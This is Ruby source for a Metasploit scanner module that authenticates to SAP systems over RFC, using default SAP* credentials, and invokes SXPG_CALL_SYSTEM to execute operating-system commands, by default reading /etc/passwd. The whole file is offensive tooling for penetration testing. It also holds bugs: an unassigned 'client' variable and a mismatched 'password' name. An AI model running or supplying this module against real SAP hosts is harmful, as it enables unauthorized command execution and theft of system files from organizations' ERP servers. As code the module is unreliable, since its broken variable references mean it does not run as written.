##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::SAP
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'SAP RFC SXPG_CALL_SYSTEM',
      'Description'    => %q{
        This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author'         => [ 'nmonkee' ],
      'License'        => BSD_LICENSE
       )

    register_options(
                     [
                       Opt::RPORT(3342),
                       OptString.new('USER', [true, 'Username', 'SAP*']),
                       OptString.new('PASS', [true, 'Password', '06071992']),
                       OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
                       OptString.new('PARAM', [true, 'Command Parameters', '/etc/passwd']),
                       OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
                     ], self.class)
  end

  def run_host(rhost)
    user = datastore['USER']
    pass = datastore['PASS']
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end

    os = datastore['OS']

    exec_CMD(user,client,pass,rhost,datastore['RPORT'], datastore['CMD'], datastore['PARAM'], os)
  end

  def exec_CMD(user, client, pass, rhost, rport, cmd, param, os)
    begin
      conn = login(rhost, rport, client, user, password)
      conn.connection_info
      function = conn.get_function("SXPG_CALL_SYSTEM")
      fc = function.get_function_call

      fc[:COMMANDNAME] = cmd
      fc[:ADDITIONAL_PARAMETERS] = param

      begin
        fc.invoke
        saptbl = Msf::Ui::Console::Table.new(
                  Msf::Ui::Console::Table::Style::Default,
                    'Header'  => "[SAP] Command Exec #{rhost}:#{rport}:#{client}",
                    'Columns' =>
                              [
                                "Output"
                              ])

        data_length = fc[:EXEC_PROTOCOL].size

        for i in 0...data_length
          data = fc[:EXEC_PROTOCOL][i][:MESSAGE]
          saptbl << [data]
        end


        print_good("Command Executed: #{cmd} #{param}")
        print(saptbl.to_s)
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
      end
    rescue NWError => e
      print_error("#{rhost}:#{rport} [SAP] exec_CMD - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
    ensure
      if conn
        conn.disconnect
      end
    end
  end
end

